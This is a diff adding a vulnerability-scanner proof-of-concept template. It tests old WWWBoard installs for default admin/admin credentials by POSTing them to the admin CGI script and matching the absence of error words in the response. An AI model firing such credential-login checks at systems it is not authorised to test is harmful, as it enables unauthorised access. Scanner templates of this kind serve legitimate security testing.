@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "WWWBoard 默认安装包含预设管理员凭据（通常为 admin/admin），远程攻击者可通过 POST 请求提交默认凭据尝试登录管理后台，验证漏洞是否存在。"
+id = "POC-AVE-1999-0744"
+name = "WWWBoard 默认用户名密码登录验证 PoC"
+severity = "high"
+tags = ["ave-1999-0744"]
+vuln_id = [
+    "CVE-1999-0954",
+    "AVE-1999-0744",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/wwwboard.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=admin&pass=admin"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "Password",
+    "Invalid",
+    "incorrect",
+    "Error",
+]
